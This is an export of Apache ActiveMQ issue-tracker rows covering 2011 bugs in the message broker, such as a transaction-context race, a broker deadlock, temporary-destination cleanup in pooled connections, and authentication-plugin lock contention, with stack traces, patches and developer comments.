	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:888)
	at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:833)
	at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:825)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:751)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.doAcknowledge(KahaDBStore.java:650)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.acknowledge(KahaDBStore.java:637)
	at org.apache.activemq.store.ProxyTopicMessageStore.acknowledge(ProxyTopicMessageStore.java:78)
	at org.apache.activemq.broker.region.Topic.acknowledge(Topic.java:505)
	at org.apache.activemq.broker.region.DurableTopicSubscription.unmatched(DurableTopicSubscription.java:85)
	at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:44)
	at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:628)
	at org.apache.activemq.broker.region.Topic$4.afterCommit(Topic.java:466)
	at org.apache.activemq.transaction.Transaction.fireAfterCommit(Transaction.java:109)
	at org.apache.activemq.transaction.Transaction.doPostCommit(Transaction.java:177)
	... 20 more
{noformat}
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60064,,,Tue Aug 23 13:35:56 UTC 2011,,,,,,,,,,,"0|i0aj07:",59352,,,,,,,,,,,,,,,,,,,,,"23/Aug/11 13:35;gtully;fix in http://svn.apache.org/viewvc?rev=1160681&view=rev;;;","23/Aug/11 13:35;gtully;Workaround is to increase the pageSize for the index, such that large values do not overflow two pages.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TransactionContext produces errors in concurrent environment,AMQ-3465,12519821,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,a.a.akimov,a.a.akimov,23/Aug/11 12:52,31/Jan/13 13:11,14/Jul/23 05:43,03/Oct/11 12:44,5.5.0,,,,,5.6.0,,,Broker,,,,3,,,,,,,,,"Method ""isInXATransaction"" of class org.apache.activemq.TransactionContext seems to be implemeted incorrectly. Here is the code:

public boolean isInXATransaction() {
    return (transactionId != null && transactionId.isXATransaction()) || !ENDED_XA_TRANSACTION_CONTEXTS.isEmpty();
}

Map ""ENDED_XA_TRANSACTION_CONTEXTS"" is a static field. TransactionContext instances are used for both outbound and inbound communications. Suppose a thread creating a new non-transactional session. It calls isInXATransaction and gets true, just because another thread is completing transactional message delivery at the same time. After XAResource.end() call but before XAResource.commit() call the map is not empty and it results in a JMSException in the first thread (see org.apache.activemq.ra.ManagedTransactionContext.setUseSharedTxContext(boolean)"").

","Windows XP SP2, Oracle JDK 1.6.0_23",kreegee,tranchida,wyoumans,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3602,AMQ-4287,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,19332,,,Mon Oct 03 12:44:13 UTC 2011,,,,,,,,,,,"0|i0aj0f:",59353,,,,,,,,,,,,,,,,,,,,,"02/Sep/11 08:44;kreegee;Is this the same as http://activemq.2283324.n4.nabble.com/Suspect-a-race-condition-in-TransactionContext-td3780046.html ?

In any case, I also get this Exception (""javax.jms.JMSException: The resource is allready being used in transaction context."") in a concurrent environment.;;;jira-users","15/Sep/11 01:38;wyoumans;I am experiencing similar issue as described in this JIRA bug report and in the nabble link.;;;","27/Sep/11 14:23;tabish;Fix and new unit test added to trunk.;;;","03/Oct/11 06:23;a.a.akimov;The patch, provided by Timothy Bish, seems to be incorrect. Here is declaration of ENDED_XA_TRANSACTION_CONTEXTS:

private final static ConcurrentHashMap<TransactionId, List<TransactionContext>> ENDED_XA_TRANSACTION_CONTEXTS = ...

So the type of map values is List<TransactionContext>. And here is the patched code:

public boolean isInXATransaction() {
    return (transactionId != null && transactionId.isXATransaction()) || (!ENDED_XA_TRANSACTION_CONTEXTS.isEmpty() && ENDED_XA_TRANSACTION_CONTEXTS.containsValue(this));
}

It is clear, the last condition ENDED_XA_TRANSACTION_CONTEXTS.containsValue(this) never holds just because the map contains lists of TransactionContext but not Transaction context itself.;;;","03/Oct/11 12:44;tabish;Fix applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Sync pom and osgi metadata,AMQ-3463,12519676,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,22/Aug/11 12:13,20/Sep/11 10:42,14/Jul/23 05:43,22/Aug/11 16:00,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"For some packages ""optional"" is different in maven and osgi metadata",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60107,,,Mon Aug 22 16:00:12 UTC 2011,,,,,,,,,,,"0|i0aj0v:",59355,,,,,,,,,,,,,,,,,,,,,"22/Aug/11 16:00;dejanb;fixed with svn revision  1160316;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveIO fix osgi metadata,AMQ-3461,12519425,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,19/Aug/11 14:54,25/Jan/12 00:32,14/Jul/23 05:43,19/Aug/11 14:56,,,,,,,,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3679,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,64398,,,Wed Jan 25 00:25:23 UTC 2012,,,,,,,,,,,"0|i0s0dz:",161539,,,,,,,,,,,,,,,,,,,,,"19/Aug/11 14:56;dejanb;fixed with svn revision 1159656;;;","25/Jan/12 00:25;mckibben;Dejan, there is a bug with this commit that causes deployment to fail in an osgi container. The correct bnd import package statement should be ""resolution:=optional"" and not ""resolution=optional"".;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Inactive durable subscribers view doesn't show selector,AMQ-3459,12519257,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,18/Aug/11 08:41,20/Sep/11 10:42,14/Jul/23 05:43,18/Aug/11 08:48,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,It's also not shown in web console for the same reason and looks like subscriber is created without selector.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14564,,,Thu Aug 18 08:48:11 UTC 2011,,,,,,,,,,,"0|i0aj13:",59356,,,,,,,,,,,,,,,,,,,,,"18/Aug/11 08:48;dejanb;Fixed with svn revision 1159090;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
temp destinations should only be deleted once all users of a pooled connection call close,AMQ-3457,12519109,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,janstey,janstey,janstey,17/Aug/11 13:11,25/Jan/12 00:48,14/Jul/23 05:43,05/Oct/11 17:17,5.x,,,,,5.6.0,,,,,,,0,,,,,,,,,"AMQ-2349 added some code to clean up temp destinations once close() is called on a pooled connection. This caused pretty much all the JMS request-reply tests to fail in Camel with ""javax.jms.InvalidDestinationException: Cannot publish to a deleted Destination"" :) 

The problem is that with a pooled connection, multiple users can be using a Connection at the same time (a reference count is kept of how many there are) so if once calls close() the temp destinations of several others could be deleted while they are still using them. I think the correct behavior would be to only delete the temp destinations when all connection users call close() (i.e. when the reference count becomes zero).

Attaching a proposed fix for this shortly for review.",5.6-SNAPSHOT,artnaseef,mikek753,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jan/12 16:34;artnaseef;PooledSessionTempDestEventListener.java;https://issues.apache.org/jira/secure/attachment/12511271/PooledSessionTempDestEventListener.java","19/Jan/12 17:49;artnaseef;TestConnectionPoolLingeringTemps.java;https://issues.apache.org/jira/secure/attachment/12511147/TestConnectionPoolLingeringTemps.java","19/Jan/12 18:22;artnaseef;TestConnectionPoolTempCleanup.java;https://issues.apache.org/jira/secure/attachment/12511152/TestConnectionPoolTempCleanup.java","17/Aug/11 13:11;janstey;amqpool.diff;https://issues.apache.org/jira/secure/attachment/12490646/amqpool.diff","19/Jan/12 18:12;artnaseef;pooledConnCleanupOwnTemps.patch;https://issues.apache.org/jira/secure/attachment/12511150/pooledConnCleanupOwnTemps.patch",,,,,,,,,,,,,,,,,5.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14534,,,Wed Jan 25 00:48:22 UTC 2012,,,,,,,Patch Available,,,,"0|i0aj1j:",59358,,,,,,,,,,,,,,,,,,,,,"17/Aug/11 13:29;tabish;Patch applied, thanks for catching that.;;;","17/Aug/11 13:36;janstey;Awesome. Thanks for the quick review!;;;","05/Oct/11 17:13;janstey;Found another issue with this... so in the original bug multiple clients were using the same pooled connection and if one of those clients called close, it could potentially delete another client's temporary destination since they all shared the same connection. The fix was to wait until all clients had called close before deleting the temp destination.

Now, in the case where there is a large pool of connections available, every client gets their own connection so the previous issue isn't a problem anymore. However, the AdvisoryConsumer holds on to a copy of all temp destinations and also adds each of these temp destinations to the connection it uses. So now, 2 connections have a reference to the same temp destination... which is a problem. If this connection is also used by a client and the client calls close, then the temp destinations will be deleted even though they are still used by another connection. 

Will commit a fix shortly for this.;;;","11/Oct/11 19:17;joed;To confirm the last comment, yup. You'll delete other clients destinations and in an active system this cleanup really will not hit...;;;","12/Oct/11 10:50;tabish;Jon's fix was committed, see: http://svn.apache.org/viewvc?view=rev&rev=1179328;;;","19/Jan/12 05:54;artnaseef;Is this a complete fix, or will it lead to temporary destinations that linger on a heavily reused connection?

Doesn't the PooledConnection need to keep track of the temporary destinations created by its sessions and specifically delete those on close()?;;;","19/Jan/12 14:04;janstey;Possibly. Though I'm just going on memory here - haven't looked at the latest code :) Are you seeing this behavior in your application?;;;","19/Jan/12 14:10;tabish;ActiveMQConnection keeps track of the temp destinations, and the patch causes the PooledConnection to ask the connection to deletes the temp destinations it created once the PooledConnection is closed, so no need to deplicate that logic in the PooledConnection.

If you are still seeing an issue then a JUnit test case to demonstrate the problem would be appropriate.;;;","19/Jan/12 16:13;artnaseef;Below is my understanding.  I'll work on a JUnit case, and send a proposal that I believe fixes the issue, a little later today.

* The PooledConnection no longer cleans up the temp destinations itself
* ConnectionPool removes the temp destinations after all references to the ConnectionPool are dropped (meaning that the underlying ActiveMQConnection is also no longer used)
* PooledConnection gets its ConnectionPool from the PooledConnectionFactory when instantiated.

* PooledConnectionFactory keeps a cache of ConnectionPool objects in a hash-map keyed on the user-name + passsword.
** On createConnection(), if the ConnectionPool (with the matching username + password) is already in the cache, it is passed to the newly created PooledConnection.
** If it's not already in the cache, a new one is added to the cache and used for the newly created PooledConnection.

Here are the changes to ConnectionPool and PooledConnection for this bug that I believe back this up.

{code}
Index: trunk/activemq-pool/src/main/java/org/apache/activemq/pool/ConnectionPool.java
===================================================================
diff -u -N -r1071256 -r1158694
--- trunk/activemq-pool/src/main/java/org/apache/activemq/pool/ConnectionPool.java	(.../ConnectionPool.java)	(revision 1071256)
+++ trunk/activemq-pool/src/main/java/org/apache/activemq/pool/ConnectionPool.java	(.../ConnectionPool.java)	(revision 1158694)
@@ -144,6 +144,12 @@
         lastUsed = System.currentTimeMillis();
         if (referenceCount == 0) {
             expiredCheck();
+            
+            // only clean up temp destinations when all users 
+            // of this connection have called close
+            if (getConnection() != null) {
+                getConnection().cleanUpTempDestinations();
+            }
         }
     }
 
Index: trunk/activemq-pool/src/main/java/org/apache/activemq/pool/PooledConnection.java
===================================================================
diff -u -N -r1142267 -r1158694
--- trunk/activemq-pool/src/main/java/org/apache/activemq/pool/PooledConnection.java	(.../PooledConnection.java)	(revision 1142267)
+++ trunk/activemq-pool/src/main/java/org/apache/activemq/pool/PooledConnection.java	(.../PooledConnection.java)	(revision 1158694)
@@ -16,9 +16,6 @@
  */
 package org.apache.activemq.pool;
 
-import java.util.Iterator;
-import java.util.concurrent.ConcurrentHashMap;
-
 import javax.jms.Connection;
 import javax.jms.ConnectionConsumer;
 import javax.jms.ConnectionMetaData;
@@ -39,7 +36,6 @@
 import org.apache.activemq.AlreadyClosedException;
 import org.apache.activemq.EnhancedConnection;
 import org.apache.activemq.advisory.DestinationSource;
-import org.apache.activemq.command.ActiveMQTempDestination;
 
 /**
  * Represents a proxy {@link Connection} which is-a {@link TopicConnection} and
@@ -73,9 +69,6 @@
     public void close() throws JMSException {
         if (this.pool != null) {
             this.pool.decrementReferenceCount();
-            if (this.pool.getConnection() != null) {
-                this.pool.getConnection().cleanUpTempDestinations();
-            }
             this.pool = null;
         }
     }
{code}

By the way, for a JUnit test - do you have any recommendation on testing whether a temporary destination has been deleted?  My plan is to produce to it from another connection and expect an exception.;;;","19/Jan/12 16:35;artnaseef;Proposal for correcting the potential for lingering temporary destinations.

This has not yet been tested; I'm posting it now to demonstrate my thinking.  Unit test is being written now.;;;","19/Jan/12 17:38;artnaseef;Producing to the temporary destination to test for its existence is not working.  Any tips on how I can check if the temporary destination is deleted?;;;","19/Jan/12 17:49;artnaseef;JUnit test case which shows the temporary destinations of closed PooledConnection objects linger.

Uses the destinationExists() method from the advisory/TempDestDeleteTest.java source - thanks!;;;","19/Jan/12 18:08;artnaseef;Corrected patch - the original missed the all-important change to the PooledConnection.close() method itself.

This was tested with the JUnit case provided and is working.;;;","19/Jan/12 18:12;artnaseef;Third try - better remove the temp dests before decrementing the count on the connection pool in case that causes the underlying ActiveMQConnection to close.;;;","19/Jan/12 18:22;artnaseef;More thorough JUnit - supercedes the TestConnectionPoolLingeringTemps.

Corrects the assertion comments and adds a test that closing one PooledConnection does not delete the temporary destinations of a second one.;;;","20/Jan/12 16:34;artnaseef;New source file that's missing from the patch and is needed for the solution.;;;","25/Jan/12 00:20;artnaseef;Is there more I can do to facilitate this?  I know I updated several times; I apologize for not providing cleaner packaging.

Should I reopen this ticket, or open a new one?;;;","25/Jan/12 00:29;tabish;You are welcome to reopen or create a new issue with your additional work.  When someone has time to review the issue they will be able to determine the correct course of action.;;;","25/Jan/12 00:48;artnaseef;Created AMQ-3680 to follow up.  It turns out I can't re-open this ticket.

Thanks!
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker may deadlock when creating queues under load with wildcard consumers,AMQ-3455,12519023,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,16/Aug/11 17:15,20/Sep/11 10:42,14/Jul/23 05:43,17/Aug/11 09:27,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"{code}Found one Java-level deadlock:
=============================
""ActiveMQ NIO Worker"":
  waiting to lock monitor 108de7878 (object 7f4ca0520, a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor),
  which is held by ""ActiveMQ NIO Worker""
""ActiveMQ NIO Worker"":
  waiting to lock monitor 108de64c8 (object 7f4ca1468, a java.lang.Object),
  which is held by ""ActiveMQ NIO Worker""
""ActiveMQ NIO Worker"":
  waiting to lock monitor 108de7878 (object 7f4ca0520, a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor),
  which is held by ""ActiveMQ NIO Worker""

Java stack information for the threads listed above:
===================================================
""ActiveMQ NIO Worker"":
	at org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor.create(VirtualDestinationInterceptor.java:67)
	- waiting to lock <7f4ca0520> (a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor)
	at org.apache.activemq.broker.region.CompositeDestinationInterceptor.create(CompositeDestinationInterceptor.java:52)
	at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:450)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:247)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:80)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95)
	at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:556)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
	- locked <7f5c933e8> (a org.apache.activemq.transport.InactivityMonitor$1)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:138)
	at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:69)
	at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94)
	at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
""ActiveMQ NIO Worker"":
	at org.apache.activemq.broker.region.AbstractRegion.getDestinations(AbstractRegion.java:231)
	- waiting to lock <7f4ca1468> (a java.lang.Object)
	at org.apache.activemq.broker.region.RegionBroker.getDestinations(RegionBroker.java:145)
	at org.apache.activemq.broker.region.virtual.VirtualTopic.create(VirtualTopic.java:56)
	at org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor.create(VirtualDestinationInterceptor.java:68)
	- locked <7f4ca0520> (a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor)
	at org.apache.activemq.broker.region.CompositeDestinationInterceptor.create(CompositeDestinationInterceptor.java:52)
	at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:450)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:247)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:80)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95)
	at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:556)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
	- locked <7f564acc8> (a org.apache.activemq.transport.InactivityMonitor$1)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:138)
	at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:69)
	at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94)
	at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
""ActiveMQ NIO Worker"":
	at org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor.intercept(VirtualDestinationInterceptor.java:47)
	- waiting to lock <7f4ca0520> (a org.apache.activemq.broker.region.virtual.VirtualDestinationInterceptor)
	at org.apache.activemq.broker.region.CompositeDestinationInterceptor.intercept(CompositeDestinationInterceptor.java:38)
	at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:129)
	- locked <7f4ca1468> (a java.lang.Object)
	at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:301)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:155)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:520)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:300)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
	- locked <7f52f5a90> (a org.apache.activemq.transport.InactivityMonitor$1)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:138)
	at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:69)
	at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94)
	at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)

Found 1 deadlock.{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14558,,,Wed Aug 17 09:27:27 UTC 2011,,,,,,,,,,,"0|i0agtj:",58998,,,,,,,,,,,,,,,,,,,,,"17/Aug/11 09:27;gtully;fix in http://svn.apache.org/viewvc?rev=1158591&view=rev lock order problem, but method sync was unnecessary;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Contention on a mutex during a stress when using SimpleAuthenticationPlugin,AMQ-3454,12519007,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,williamd,williamd,16/Aug/11 15:21,25/Jul/18 15:40,14/Jul/23 05:43,28/Nov/11 14:35,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"
I am testing ActiveMQ 5.5 with my own stress test. I tried to implement a stress test that use jms ressource in the same fashion that my application would do. 

For that, I used jms template (from Spring) and  a pooled connection factory (as recommended). I run a fixed number of thread that plublish on fixed number of topics. Each thread pick up a topic and enter a loop that will send a message on the choosen topic.

The issue is reproductible with SimpleAuthenticationPlugin active.  

Configuration of the test : 

* 100 topics
* more than one thread per topic (actually 1500 producer threads)

Common connection properties :
* alwaysSessionAsync=false
* dispatchAsync=false 
* optimizeAcknowledge=true
* socketBufferSize=131072&trace=true&wireFormat.cacheSize=2048&wireFormat.tcpNoDelayEnabled=true&wireFormat.tightEncodingEnabled=true&keepAlive=true&soTimeout=10000&connectionTimeout=10000\


Producers : 
* Message are not persistent
* There is no transaction
* Message expiration time is 30s
* Unsing JMS template singleton with a PooledConnectionFactory
* 3 JVM running 
* connection options alwaysSyncSend=true,copyMessageOnSend=false

Consumers :
* just listening to each topic with a SimpleMessageListenerContainer and count messages received
* 3 JVM running 


In attachment, you will find activemq config file and thread dumps. I can attach the producer/consumers code if you need it but I think you have your own tests.

This Jira is critical for me because security is mandatory for our use.

